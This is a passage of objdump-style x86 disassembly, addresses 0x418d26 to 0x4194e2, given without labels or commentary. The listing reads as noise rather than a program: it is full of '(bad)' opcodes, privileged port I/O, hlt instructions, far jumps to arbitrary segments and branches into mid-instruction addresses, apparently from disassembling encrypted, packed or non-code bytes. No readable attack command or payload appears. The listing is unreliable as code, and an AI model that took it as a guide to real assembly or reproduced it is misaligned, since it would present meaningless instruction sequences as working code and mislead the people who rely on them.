  418d26:	aad    0xfc
  418d28:	in     eax,dx
  418d29:	jbe    0x418d05
  418d2b:	ins    BYTE PTR es:[edi],dx
  418d2c:	sbb    al,0x98
  418d2e:	push   eax
  418d2f:	xchg   edx,eax
  418d30:	pop    ebp
  418d31:	pop    ds
  418d32:	es jno 0x418d0e
  418d35:	sub    cl,BYTE PTR [ebx+0x7352ae85]
  418d3b:	dec    edi
  418d3c:	add    DWORD PTR [edi+0x56],eax
  418d3f:	stos   BYTE PTR es:[edi],al
  418d40:	popf   
  418d41:	jbe    0x418cc6
  418d43:	loope  0x418ced
  418d45:	jp     0x418d8a
  418d47:	push   edx
  418d48:	cmp    DWORD PTR [esi+0x3b],ecx
  418d4b:	mov    DWORD PTR [eax+0x213b0f52],ecx
  418d51:	pop    ecx
  418d52:	mov    ds,WORD PTR [ecx-0x50]
  418d55:	jmp    0xdd2a:0x1efe8731
  418d5c:	sub    DWORD PTR [ebx],edx
  418d5e:	push   es
  418d5f:	cli    
  418d60:	repnz sti 
  418d62:	add    ch,ah
  418d64:	ins    DWORD PTR es:[edi],dx
  418d65:	pusha  
  418d66:	hlt    
  418d67:	xchg   esi,eax
  418d68:	mov    BYTE PTR [ecx-0x1f],bh
  418d6b:	push   cs
  418d6c:	mov    dl,0x56
  418d6e:	lods   al,BYTE PTR ds:[esi]
  418d6f:	add    al,0xdf
  418d71:	cmp    edi,ecx
  418d73:	jg     0x418da0
  418d75:	adc    DWORD PTR [esi],edi
  418d77:	outs   dx,DWORD PTR ds:[esi]
  418d78:	and    BYTE PTR [ecx-0x15],ch
  418d7b:	push   edi
  418d7c:	adc    esp,0xffffffdb
  418d7f:	(bad)  
  418d80:	arpl   bx,dx
  418d82:	sbb    eax,0x5a3b00c
  418d87:	mov    ds:0x9675fb23,al
  418d8c:	ret    
  418d8d:	outs   dx,BYTE PTR ds:[esi]
  418d8e:	mov    edx,DWORD PTR [edi+0x36]
  418d91:	scas   al,BYTE PTR es:[edi]
  418d92:	jg     0x418e0a
  418d94:	mov    dl,0x81
  418d96:	jmp    0x418df3
  418d98:	in     al,0x62
  418d9a:	(bad)  
  418d9b:	pop    ebx
  418d9c:	inc    eax
  418d9d:	out    0xde,eax
  418d9f:	pop    eax
  418da0:	mov    ah,0x50
  418da2:	sbb    esi,DWORD PTR [ebx-0x303288fc]
  418da8:	ret    
  418da9:	sub    esp,DWORD PTR [esi-0x4d146a70]
  418daf:	pop    eax
  418db0:	aad    0xdb
  418db2:	test   ebx,eax
  418db4:	xchg   DWORD PTR [ebx-0x76],esp
  418db7:	into   
  418db8:	mov    dh,0xe9
  418dba:	ret    0x9c2
  418dbd:	mov    bl,0x90
  418dbf:	ins    BYTE PTR es:[edi],dx
  418dc0:	stos   DWORD PTR es:[edi],eax
  418dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dc2:	pop    ebx
  418dc3:	stc    
  418dc4:	(bad)  
  418dc5:	fist   DWORD PTR [ebx+edx*4-0x58548cfc]
  418dcc:	in     al,0xfd
  418dce:	in     al,0x8a
  418dd0:	jo     0x418d80
  418dd2:	sub    eax,0xa4ec9443
  418dd7:	not    BYTE PTR [ecx-0x60]
  418dda:	aam    0xed
  418ddc:	ins    BYTE PTR es:[edi],dx
  418ddd:	xor    esi,DWORD PTR [edi]
  418ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de0:	sbb    ah,BYTE PTR [edx+ecx*2+0x53]
  418de4:	xchg   DWORD PTR [esi+0x6d],ecx
  418de7:	int3   
  418de8:	mov    ebp,0x8e7dcd93
  418ded:	pop    esi
  418dee:	addr16 push esp
  418df0:	sub    ch,BYTE PTR [esi+eiz*1-0x72]
  418df4:	enter  0x57fd,0x8a
  418df8:	or     al,BYTE PTR [eax]
  418dfa:	in     eax,0x43
  418dfc:	xchg   dh,dl
  418dfe:	or     al,0xe7
  418e00:	fmul   st(7),st
  418e02:	mov    ds:0x74f2919a,eax
  418e07:	xchg   esi,eax
  418e08:	pushf  
  418e09:	test   eax,0x838e76ac
  418e0e:	ficomp DWORD PTR [ebx-0x59ef203f]
  418e14:	jmp    0x595d:0xb6f827c7
  418e1b:	mov    edi,0xa6cbca6f
  418e20:	cmp    DWORD PTR [edi],ebp
  418e22:	add    ch,BYTE PTR [edx]
  418e24:	inc    ebp
  418e25:	add    esi,DWORD PTR [eax+ecx*1]
  418e28:	mov    dh,0xfd
  418e2a:	sahf   
  418e2b:	pop    edx
  418e2c:	cmp    al,0xc4
  418e2e:	idiv   DWORD PTR ds:0x70355b14
  418e34:	outs   dx,BYTE PTR ds:[esi]
  418e35:	push   es
  418e36:	push   edi
  418e37:	gs jmp 0x418e62
  418e3a:	dec    ebp
  418e3b:	test   eax,0x576591a9
  418e40:	fcomp  DWORD PTR [bx]
  418e43:	pop    esi
  418e44:	sub    DWORD PTR [ecx],esi
  418e46:	or     bh,ch
  418e48:	sbb    DWORD PTR [ebx],esp
  418e4a:	fs jnp 0x418e0c
  418e4d:	hlt    
  418e4e:	mov    eax,ds:0x9c267e23
  418e53:	jo     0x418e97
  418e55:	jg     0x418de3
  418e57:	xlat   BYTE PTR ds:[ebx]
  418e58:	shl    bh,0xd
  418e5b:	push   cs
  418e5c:	in     eax,dx
  418e5d:	xor    dl,cl
  418e5f:	xor    eax,0x8008cff4
  418e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e65:	int    0x12
  418e67:	xor    eax,0x7e34cff5
  418e6c:	pop    es
  418e6d:	jl     0x418ec3
  418e6f:	jecxz  0x418e5d
  418e71:	dec    ecx
  418e72:	push   es
  418e73:	shr    DWORD PTR [edi],1
  418e75:	adc    al,0x52
  418e77:	addr16 dec eax
  418e79:	popa   
  418e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e7b:	nop
  418e7c:	cmp    eax,0x21413344
  418e81:	dec    ebx
  418e82:	sub    BYTE PTR [edi],0x2
  418e85:	sub    DWORD PTR [edi+0x5544b8d3],edi
  418e8b:	lahf   
  418e8c:	or     ebp,DWORD PTR [ecx+edx*2]
  418e8f:	scas   eax,DWORD PTR es:[edi]
  418e90:	adc    DWORD PTR [esi-0x2c9f27e1],0xf5db78f8
  418e9a:	nop
  418e9b:	popf   
  418e9c:	mov    edx,0xfc3bf9d8
  418ea1:	into   
  418ea2:	test   DWORD PTR [ebx-0x7e],eax
  418ea5:	das    
  418ea6:	jecxz  0x418f20
  418ea8:	lea    eax,[esi+ebx*8+0x6a]
  418eac:	in     al,dx
  418ead:	adc    eax,0xe1992ad7
  418eb2:	pusha  
  418eb3:	adc    esi,DWORD PTR [ebx-0x13]
  418eb6:	mov    eax,0x88e34d12
  418ebb:	mov    dh,0x4c
  418ebd:	add    BYTE PTR [ebx+0xa],dl
  418ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ec1:	jle    0x418f31
  418ec3:	inc    edi
  418ec4:	std    
  418ec5:	sub    DWORD PTR [edi],ecx
  418ec7:	or     al,0x82
  418ec9:	rcr    BYTE PTR [eax+0x15f9b3e0],1
  418ecf:	sti    
  418ed0:	dec    ebp
  418ed1:	sub    BYTE PTR [ecx-0x5e271933],ah
  418ed7:	and    DWORD PTR [eiz*4-0x576d1d33],edx
  418ede:	add    al,0xea
  418ee0:	loop   0x418e98
  418ee2:	push   edi
  418ee3:	mov    eax,ds:0x78e23910
  418ee8:	repz mov cl,dl
  418eeb:	push   edx
  418eec:	retf   
  418eed:	mov    bl,0x7a
  418eef:	cmp    al,0xa2
  418ef1:	out    dx,eax
  418ef2:	add    al,0x82
  418ef4:	mov    ebp,0xbdc40e6f
  418ef9:	add    eax,0xc42d8cca
  418efe:	mov    eax,0xe57855a9
  418f03:	add    al,BYTE PTR [esi]
  418f05:	test   eax,0xf3cb1015
  418f0a:	dec    esp
  418f0b:	cmp    ah,bl
  418f0d:	xchg   ebx,eax
  418f0e:	mov    ah,0x34
  418f10:	sar    al,1
  418f12:	enter  0x5bdd,0x6
  418f16:	pop    ss
  418f17:	retw   
  418f19:	adc    eax,DWORD PTR ds:0x1dd2a261
  418f1f:	pop    esp
  418f20:	sub    al,0x8d
  418f22:	cld    
  418f23:	data16 fnstcw WORD PTR [edx+edx*8+0x53]
  418f28:	dec    ecx
  418f29:	hlt    
  418f2a:	out    dx,eax
  418f2b:	data16 aad 0x2
  418f2e:	xchg   edx,eax
  418f2f:	pop    eax
  418f30:	sbb    BYTE PTR [eax+0x6ff2b38d],al
  418f36:	sti    
  418f37:	(bad)  
  418f38:	inc    ebp
  418f39:	mov    eax,0x3f233ab5
  418f3e:	das    
  418f3f:	aam    0xcd
  418f41:	(bad)  
  418f42:	xlat   BYTE PTR ds:[ebx]
  418f43:	jno    0xc648d33d
  418f49:	jg     0x418f40
  418f4b:	imul   BYTE PTR [esi-0x1f8a7b4c]
  418f51:	ret    0x35ff
  418f54:	dec    esp
  418f55:	mov    al,ds:0xb4363526
  418f5a:	xchg   ebx,eax
  418f5b:	int3   
  418f5c:	pop    es
  418f5d:	jp     0x418fc2
  418f5f:	xchg   ebp,eax
  418f60:	sbb    edi,DWORD PTR [eax+0x286b88a3]
  418f66:	clc    
  418f67:	test   DWORD PTR [ebp+0x62],ebx
  418f6a:	sbb    eax,DWORD PTR [edx]
  418f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f6d:	in     al,dx
  418f6e:	out    dx,eax
  418f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f70:	mov    eax,0xef51262c
  418f75:	fisttp DWORD PTR [eax+0x59f4b7d5]
  418f7b:	outs   dx,BYTE PTR ds:[esi]
  418f7c:	pop    ebx
  418f7d:	adc    al,0xdb
  418f7f:	cmp    DWORD PTR [ebx-0x47],edx
  418f82:	out    0x81,al
  418f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f85:	shl    BYTE PTR cs:[eax],1
  418f88:	cmp    BYTE PTR [ebp-0x1e],0xad
  418f8c:	fst    QWORD PTR [eax+esi*8-0x4e]
  418f90:	das    
  418f91:	test   edx,ebp
  418f93:	mov    cl,0x53
  418f95:	jnp    0x418f96
  418f97:	jae    0x418f3b
  418f99:	push   eax
  418f9a:	(bad)  
  418f9b:	adc    BYTE PTR [ecx-0x4b2f815f],cl
  418fa1:	mov    DWORD PTR ds:0xf946063d,edi
  418fa7:	push   ecx
  418fa8:	aas    
  418fa9:	iret   
  418faa:	aam    0x9d
  418fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fad:	dec    eax
  418fae:	pop    ebp
  418faf:	mov    edx,0xd0fd6f58
  418fb4:	xlat   BYTE PTR ds:[ebx]
  418fb5:	adc    ebx,ebp
  418fb7:	out    0xcd,al
  418fb9:	add    BYTE PTR ds:0xb6f19265,0x92
  418fc0:	shr    dl,1
  418fc2:	push   0xffffffcf
  418fc4:	inc    esi
  418fc5:	sti    
  418fc6:	in     eax,0x57
  418fc8:	sub    al,0x16
  418fca:	pop    es
  418fcb:	push   ebx
  418fcc:	les    edx,FWORD PTR [edi]
  418fce:	pop    ds
  418fcf:	mov    bh,0x22
  418fd1:	adc    al,0x95
  418fd3:	mov    cl,0x74
  418fd5:	xchg   esp,eax
  418fd6:	dec    esi
  418fd7:	add    eax,DWORD PTR [ebp-0x80]
  418fda:	cmp    al,0x96
  418fdc:	and    edi,esp
  418fde:	loopne 0x41903a
  418fe0:	cld    
  418fe1:	cli    
  418fe2:	adc    DWORD PTR [esi],esp
  418fe4:	lods   eax,DWORD PTR ds:[esi]
  418fe5:	or     BYTE PTR [edx-0x1b],bh
  418fe8:	shl    BYTE PTR [esi],0x9
  418feb:	stos   BYTE PTR es:[edi],al
  418fec:	das    
  418fed:	xchg   ebx,eax
  418fee:	pop    eax
  418fef:	ror    cl,1
  418ff1:	cmp    ebp,edi
  418ff3:	shr    dl,1
  418ff5:	pop    esi
  418ff6:	pop    eax
  418ff7:	imul   esi,DWORD PTR [ebp+eax*2+0x3],0xa76bd4b7
  418fff:	icebp  
  419000:	fld    QWORD PTR [eax-0x42]
  419003:	loop   0x418f8f
  419005:	lods   eax,DWORD PTR ds:[esi]
  419006:	in     eax,dx
  419007:	aaa    
  419008:	aad    0x43
  41900a:	stos   BYTE PTR es:[edi],al
  41900b:	sub    eax,0x2b2a8891
  419010:	dec    ecx
  419011:	cld    
  419012:	enter  0x279e,0x1a
  419016:	cmp    eax,0xad0c00e8
  41901b:	xor    DWORD PTR [edi+ebp*2-0x5],eax
  41901f:	push   esp
  419020:	pop    edx
  419021:	add    ebp,ebx
  419023:	sub    BYTE PTR [esi],al
  419025:	push   es
  419026:	xor    al,0xfd
  419028:	push   ebx
  419029:	mov    al,ds:0x74e85a8e
  41902e:	fcmovb st,st(2)
  419030:	dec    ecx
  419031:	test   eax,0x6ce0fa4c
  419036:	mov    dl,BYTE PTR [esi]
  419038:	(bad)  
  419039:	push   eax
  41903a:	inc    ecx
  41903b:	xor    ch,BYTE PTR [edx]
  41903d:	ss ja  0x41908b
  419040:	out    dx,eax
  419041:	jmp    0xee83:0x30688dc7
  419048:	imul   ebx,DWORD PTR [ecx-0x3f],0x2431c480
  41904f:	add    eax,0x3e69a78c
  419054:	dec    eax
  419055:	mov    eax,ds:0x2df63ee5
  41905a:	out    dx,al
  41905b:	sbb    BYTE PTR [ecx-0x3d],dl
  41905e:	loop   0x4190ba
  419060:	xchg   BYTE PTR [ebx],dl
  419062:	test   al,0xb6
  419064:	inc    ebx
  419065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419066:	push   esi
  419067:	or     al,0x4c
  419069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41906a:	fst    DWORD PTR [eax+0x36]
  41906d:	in     eax,dx
  41906e:	jne    0x419083
  419070:	jl     0x419056
  419072:	cs dec esi
  419074:	fwait
  419075:	add    BYTE PTR [ebp+eiz*2-0x25b5c989],ah
  41907c:	mov    ecx,0xc33d8779
  419081:	ins    BYTE PTR es:[edi],dx
  419082:	mov    dh,0x14
  419084:	imul   edi,DWORD PTR [eax-0x1fa12b98],0x14355134
  41908e:	pop    eax
  41908f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419090:	ss iretw 
  419093:	or     al,0xff
  419095:	das    
  419096:	mov    eax,0x3d32ff42
  41909b:	mov    ?,WORD PTR [esi+0x3e7bc3c1]
  4190a1:	shl    DWORD PTR [esi],0x1a
  4190a4:	and    esi,esi
  4190a6:	scas   al,BYTE PTR es:[edi]
  4190a7:	sbb    ch,BYTE PTR [ebx-0x666d6a13]
  4190ad:	or     cl,0x2e
  4190b0:	jo     0x4190dc
  4190b2:	outs   dx,BYTE PTR ds:[esi]
  4190b3:	jmp    0x952d8d93
  4190b8:	sub    al,0xcd
  4190ba:	je     0x419068
  4190bc:	ins    BYTE PTR es:[edi],dx
  4190bd:	dec    eax
  4190be:	dec    ebp
  4190bf:	xor    eax,0x3704de8
  4190c4:	(bad)  [esi-0x4291418f]
  4190ca:	xchg   ebp,eax
  4190cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190cc:	loopne 0x41913b
  4190ce:	popa   
  4190cf:	mov    ah,0x81
  4190d1:	add    BYTE PTR [ecx],ah
  4190d3:	cmp    dh,BYTE PTR [eax-0x123d571]
  4190d9:	and    al,dh
  4190db:	push   es
  4190dc:	cld    
  4190dd:	or     eax,0x27428115
  4190e2:	push   0xffffffac
  4190e4:	or     eax,0x2d0010c3
  4190e9:	mov    ah,0xbe
  4190eb:	aas    
  4190ec:	inc    edi
  4190ed:	ja     0x419097
  4190ef:	adc    al,0x62
  4190f1:	inc    edx
  4190f2:	xchg   ebx,eax
  4190f3:	shl    DWORD PTR [ecx+0xc],cl
  4190f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190f7:	push   eax
  4190f8:	push   eax
  4190f9:	fucomp st(7)
  4190fb:	mov    ebp,0x1f1a88b2
  419100:	adc    al,0x84
  419102:	or     eax,0x9288344c
  419107:	aaa    
  419108:	iret   
  419109:	stos   DWORD PTR es:[edi],eax
  41910a:	sahf   
  41910b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41910c:	push   0xd803c56e
  419111:	sub    DWORD PTR [edx-0x251c8646],ebx
  419117:	and    bh,ch
  419119:	or     ecx,esi
  41911b:	pop    ebp
  41911c:	or     eax,0xdb7749c2
  419121:	rcl    BYTE PTR [edx-0x79551e02],cl
  419127:	xor    eax,0x6d890680
  41912c:	cmp    eax,0x20
  41912f:	bound  edi,QWORD PTR [esi]
  419131:	mov    esp,0x511d6129
  419136:	xchg   esi,eax
  419137:	or     al,0x2e
  419139:	sub    cl,BYTE PTR [eax]
  41913b:	pop    eax
  41913c:	popa   
  41913d:	and    al,0xdb
  41913f:	xor    eax,0xd74befc0
  419144:	fcmovne st,st(7)
  419146:	pop    esp
  419147:	jg     0x4190f5
  419149:	imul   edi,DWORD PTR [ebx],0xe1fc645f
  41914f:	call   0xcee9:0x8769
  419155:	call   0x470d:0x726d1e71
  41915c:	xchg   ecx,eax
  41915d:	mov    ah,0xc2
  41915f:	sbb    al,0x8a
  419161:	das    
  419162:	aam    0xe3
  419164:	das    
  419165:	sub    BYTE PTR [eax+ebp*1+0x5f],cl
  419169:	cli    
  41916a:	lea    edi,[esi]
  41916c:	add    DWORD PTR [edx-0x73509323],esp
  419172:	add    DWORD PTR [ecx+edx*8-0x7c51273e],ebp
  419179:	xor    eax,ebp
  41917b:	in     al,0xd9
  41917d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41917e:	call   0x215e:0x4e1a1092
  419185:	nop
  419186:	cmp    eax,0xfeeb5f79
  41918b:	cld    
  41918c:	stos   DWORD PTR es:[edi],eax
  41918d:	cmc    
  41918e:	xchg   esp,eax
  41918f:	inc    esi
  419190:	es loop 0x41915a
  419193:	lock pusha 
  419195:	aaa    
  419196:	jecxz  0x419174
  419198:	addr16 xchg esp,eax
  41919a:	stos   BYTE PTR es:[edi],al
  41919b:	clc    
  41919c:	nop
  41919d:	jmp    0x8568db72
  4191a2:	add    al,0xc8
  4191a4:	or     cl,BYTE PTR [eax-0x71]
  4191a7:	and    eax,0xf94cfb4a
  4191ac:	retf   0xbefe
  4191af:	aaa    
  4191b0:	cmp    BYTE PTR ds:0xd3477674,al
  4191b6:	or     DWORD PTR [edi+0x34],esp
  4191b9:	mov    DWORD PTR [eax+0x51f5e55b],edi
  4191bf:	cmp    BYTE PTR [esi+0x58],ah
  4191c2:	addr16 mov ebx,0x17b7fbe7
  4191c8:	pop    esi
  4191c9:	cmp    eax,0x28500a1d
  4191ce:	loope  0x41917a
  4191d0:	dec    ecx
  4191d1:	jbe    0x419198
  4191d3:	into   
  4191d4:	adc    BYTE PTR [esi+0x8],0x26
  4191d8:	mov    ecx,esi
  4191da:	call   0xb5e5d970
  4191df:	inc    esp
  4191e0:	xchg   edi,eax
  4191e1:	aad    0xe8
  4191e3:	rcl    BYTE PTR [ebx-0x3b376b4],cl
  4191e9:	jbe    0x4191f2
  4191eb:	fild   DWORD PTR [ebx]
  4191ed:	jle    0x4191bc
  4191ef:	dec    ecx
  4191f0:	cs (bad) 
  4191f2:	mov    dh,0xd8
  4191f4:	(bad)  
  4191f5:	loope  0x419179
  4191f7:	xchg   esp,eax
  4191f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f9:	in     eax,0x66
  4191fb:	call   0xe72e:0x2e27c9df
  419202:	jne    0x4191d4
  419204:	push   cs
  419205:	ror    DWORD PTR [eax],cl
  419207:	jns    0x41923d
  419209:	clc    
  41920a:	adc    DWORD PTR [ecx-0x19],eax
  41920d:	cmp    al,0x64
  41920f:	les    esi,FWORD PTR [edx-0x4194f965]
  419215:	push   0x1a9628be
  41921a:	adc    edx,eax
  41921c:	das    
  41921d:	cld    
  41921e:	in     al,dx
  41921f:	add    DWORD PTR [edx+0x2c53c9f7],edx
  419225:	inc    edx
  419226:	scas   eax,DWORD PTR es:[edi]
  419227:	xchg   esp,eax
  419228:	mov    ebx,0x26dd51eb
  41922d:	xchg   esp,eax
  41922e:	jecxz  0x41923c
  419230:	or     BYTE PTR [ebp+edi*2+0x251ff8c1],ah
  419237:	push   cs
  419238:	add    eax,0xc84a6fa3
  41923d:	cmp    eax,0x809b9109
  419242:	dec    edx
  419243:	and    eax,0xe623aee0
  419248:	and    bh,cl
  41924a:	cs mov dl,0xa0
  41924d:	mov    ebp,ebx
  41924f:	scas   eax,DWORD PTR es:[edi]
  419250:	inc    esp
  419251:	jmp    0xf999:0x6c9e5ba0
  419258:	data16 mov bl,0x97
  41925b:	add    ebp,DWORD PTR [edx+0x47]
  41925e:	dec    esp
  41925f:	jo     0x419263
  419261:	xchg   edi,eax
  419262:	push   ss
  419263:	xor    esp,DWORD PTR [ecx+ecx*8+0x23]
  419267:	xor    BYTE PTR [ecx+0x279e7ff8],cl
  41926d:	hlt    
  41926e:	xchg   ecx,eax
  41926f:	shr    DWORD PTR [ebx],0x31
  419272:	(bad)  
  419273:	loope  0x419265
  419275:	mov    ds:0xf6423118,al
  41927a:	cmp    al,dh
  41927c:	xchg   ecx,eax
  41927d:	jecxz  0x419223
  41927f:	inc    ebx
  419280:	loop   0x419212
  419282:	loopne 0x419277
  419284:	jecxz  0x4192d5
  419286:	addr16 pop ebp
  419288:	scas   eax,DWORD PTR es:[edi]
  419289:	push   ecx
  41928a:	(bad)  
  41928b:	cmp    DWORD PTR [edi-0x2e],eax
  41928e:	cmovno edx,DWORD PTR [esi-0x389a692b]
  419295:	push   esp
  419296:	sub    BYTE PTR [ecx-0x3f],0x3d
  41929a:	rcl    edi,0x5
  41929d:	jns    0x4192f1
  41929f:	and    bl,dl
  4192a1:	loope  0x41928a
  4192a3:	mov    cl,0x62
  4192a5:	xchg   ebx,eax
  4192a6:	inc    esi
  4192a7:	jge    0x41928f
  4192a9:	out    0xc,eax
  4192ab:	in     eax,dx
  4192ac:	xor    DWORD PTR [ebx],ebx
  4192ae:	(bad)  
  4192af:	test   DWORD PTR [edx+0x19e6b417],0xad2772e2
  4192b9:	jp     0x419293
  4192bb:	inc    ebx
  4192bc:	push   ecx
  4192bd:	pop    eax
  4192be:	xchg   BYTE PTR [edi-0x73],ah
  4192c1:	sbb    eax,DWORD PTR [edi+0x23]
  4192c4:	loop   0x4192e5
  4192c6:	adc    edx,DWORD PTR [eax-0x5e0805dc]
  4192cc:	add    cl,BYTE PTR [ebx-0x6]
  4192cf:	sbb    BYTE PTR [edx-0x17],0x8f
  4192d3:	mov    ch,0xb1
  4192d5:	add    al,0x7c
  4192d7:	clc    
  4192d8:	dec    edx
  4192d9:	cld    
  4192da:	lock (bad) 
  4192dd:	test   DWORD PTR [eax+0x2a],edi
  4192e0:	adc    al,0xe1
  4192e2:	xor    ebx,eax
  4192e4:	call   0x5352e426
  4192e9:	gs shl esi,cl
  4192ec:	es aas 
  4192ee:	mov    ah,0x1f
  4192f0:	rcl    edx,1
  4192f2:	jbe    0x4192ab
  4192f4:	cdq    
  4192f5:	xor    al,0x22
  4192f7:	in     al,0xb5
  4192f9:	push   edx
  4192fa:	jne    0x419291
  4192fc:	pop    ss
  4192fd:	lods   al,BYTE PTR ds:[esi]
  4192fe:	mov    esi,0xb03f6b3
  419303:	jmp    0x4192d7
  419305:	mov    esi,0x227e4350
  41930a:	jmp    0xe53a:0x94753ba
  419311:	adc    al,0xc6
  419313:	hlt    
  419314:	xor    cl,BYTE PTR [esi+esi*8+0x3b7a5356]
  41931b:	push   0xffffffa5
  41931d:	cmp    DWORD PTR [esi-0x5b5e680f],edi
  419323:	sub    BYTE PTR [esi+0x27],0xf8
  419327:	mov    al,0x58
  419329:	pop    ebx
  41932a:	iret   
  41932b:	test   BYTE PTR [edx-0x5ae4c096],al
  419331:	test   BYTE PTR ds:0xa208d3f5,ah
  419337:	popa   
  419338:	jo     0x419327
  41933a:	xchg   BYTE PTR [edi+0x2b477651],ch
  419340:	pop    es
  419341:	xchg   ecx,eax
  419342:	inc    si
  419344:	aad    0x12
  419346:	sti    
  419347:	mov    ds:0x7922dd0,al
  41934c:	jnp    0x4193a2
  41934e:	or     BYTE PTR [edi],ch
  419350:	into   
  419351:	das    
  419352:	ja     0x41931d
  419354:	hlt    
  419355:	mov    edx,0x939f388b
  41935a:	out    dx,al
  41935b:	iret   
  41935c:	mov    edx,0x28003836
  419361:	inc    ecx
  419362:	dec    edx
  419363:	das    
  419364:	sub    BYTE PTR [esi-0x22],bh
  419367:	sbb    DWORD PTR [ebx+edi*4],ebp
  41936a:	aad    0x6b
  41936c:	dec    edi
  41936d:	cli    
  41936e:	mov    cl,0xf7
  419370:	push   ebx
  419371:	mov    bl,0x63
  419373:	mov    ds:0x8c6126d6,al
  419378:	inc    edi
  419379:	inc    edx
  41937a:	add    esp,esi
  41937c:	bound  ecx,QWORD PTR [edx+ebp*1-0x48]
  419380:	cwde   
  419381:	push   esp
  419382:	mov    bl,0x97
  419384:	jg     0x4193d2
  419386:	js     0x4193f3
  419388:	push   cs
  419389:	or     DWORD PTR [esi+0x7c],esp
  41938c:	pop    ebx
  41938d:	aaa    
  41938e:	(bad)  
  41938f:	jbe    0x41934a
  419391:	xlat   BYTE PTR es:[ebx]
  419393:	mov    al,ds:0xd4c3deba
  419398:	(bad)  
  419399:	and    dh,BYTE PTR [eax-0x760eff21]
  41939f:	mov    cl,0xfd
  4193a1:	push   eax
  4193a2:	mov    BYTE PTR [ebx+0x49],cl
  4193a5:	jmp    0xbc36:0x6a2e0277
  4193ac:	sbb    dl,BYTE PTR ds:[ebx-0xf9ad022]
  4193b3:	mov    cl,0x9d
  4193b5:	add    edx,ebp
  4193b7:	xor    DWORD PTR [edx-0x52],0xe7b56fe9
  4193be:	stc    
  4193bf:	sbb    BYTE PTR [ecx-0x57],al
  4193c2:	ds sbb ebx,ebp
  4193c5:	inc    ebx
  4193c6:	jecxz  0x41934c
  4193c8:	(bad)  
  4193c9:	fsubr  QWORD PTR [edx*1-0x5e9305c4]
  4193d0:	inc    ebp
  4193d1:	dec    ecx
  4193d2:	and    DWORD PTR [edx+ebx*2-0xc694433],ebx
  4193d9:	aam    0xec
  4193db:	repz int 0x2d
  4193de:	mov    edi,0xc187d36f
  4193e3:	fisub  WORD PTR [edx+0x3a]
  4193e6:	pop    esi
  4193e7:	pushf  
  4193e8:	xchg   esi,eax
  4193e9:	rcl    ecx,0x62
  4193ec:	or     BYTE PTR [ebp+0x43],0x4d
  4193f0:	sti    
  4193f1:	mov    ds:0x2acc66c5,eax
  4193f6:	cmp    eax,0x7bcc45c9
  4193fb:	aad    0x8a
  4193fd:	xor    bh,bl
  4193ff:	xor    ch,dl
  419401:	mov    esi,0x6e0ab148
  419406:	ins    DWORD PTR es:[edi],dx
  419407:	mov    eax,0x927e879d
  41940c:	jmp    0x781e:0x4166e670
  419413:	adc    bl,0xd8
  419416:	sti    
  419417:	ja     0x4193a5
  419419:	xchg   ebx,eax
  41941a:	or     dl,BYTE PTR [edi+0x20]
  41941d:	mov    eax,0x82eb9aaa
  419422:	(bad)  
  419423:	jmp    0xaf42:0x2932bb4a
  41942a:	clc    
  41942b:	sub    al,0xd5
  41942d:	ss push 0x1319d21b
  419433:	mov    esi,0x9798fcb6
  419438:	(bad)
  41943b:	jo     0x419479
  41943d:	inc    edx
  41943e:	les    edx,FWORD PTR [edx-0x3]
  419441:	and    eax,0xdb777a7b
  419446:	and    eax,0x60b29ad
  41944b:	fcos   
  41944d:	xchg   edi,eax
  41944e:	imul   eax,DWORD PTR [edx+0x42],0x56964f5a
  419455:	push   eax
  419456:	mov    bl,0x13
  419458:	inc    edi
  419459:	or     al,cl
  41945b:	shr    DWORD PTR [esi+0x5edb63e6],cl
  419461:	adc    BYTE PTR [eax],ah
  419463:	loop   0x419458
  419465:	in     eax,dx
  419466:	addr16 call 0xaf8f9e37
  41946c:	(bad)  
  41946d:	xchg   ebp,eax
  41946e:	push   cs
  41946f:	push   esi
  419470:	pop    eax
  419471:	inc    edx
  419472:	(bad)  
  419473:	push   edx
  419474:	mov    eax,ds:0xaa045522
  419479:	push   ecx
  41947a:	jae    0x419402
  41947c:	(bad)
  419480:	push   ss
  419481:	lods   al,BYTE PTR ds:[esi]
  419482:	mov    ?,ebp
  419484:	xchg   ecx,eax
  419485:	shr    DWORD PTR [ebx+eax*1+0x2b],0xd
  41948a:	lahf   
  41948b:	mov    ch,0xe6
  41948d:	mov    ecx,0x3427fc03
  419492:	out    dx,al
  419493:	mov    esi,DWORD PTR [edi]
  419495:	lods   al,BYTE PTR ds:[esi]
  419496:	push   esi
  419497:	xlat   BYTE PTR ds:[ebx]
  419498:	not    DWORD PTR [edi]
  41949a:	vpsllw xmm3,xmm7,XMMWORD PTR [ebx-0x28]
  41949f:	add    DWORD PTR [ebp+0x3b],ebx
  4194a2:	dec    eax
  4194a3:	je     0x419499
  4194a5:	pop    es
  4194a6:	adc    eax,0xcb708f9d
  4194ab:	mov    edx,0x3991a52f
  4194b0:	cdq    
  4194b1:	sub    dl,BYTE PTR [edx+0x50b433d3]
  4194b7:	div    ebx
  4194b9:	jmp    0x3007:0xddf61ab4
  4194c0:	lock jo 0x41950b
  4194c3:	sbb    eax,0x7b6d391f
  4194c8:	xchg   ecx,eax
  4194c9:	mov    eax,ds:0xaa66a568
  4194ce:	jne    0x419463
  4194d0:	add    bh,BYTE PTR [ecx]
  4194d2:	out    dx,al
  4194d3:	push   0x4af1aa17
  4194d8:	mov    ebx,0xda5703f8
  4194dd:	ds sub esi,edi
  4194e0:	mov    bh,0x25
  4194e2:	mov    ds:0xf82d9a34,eax
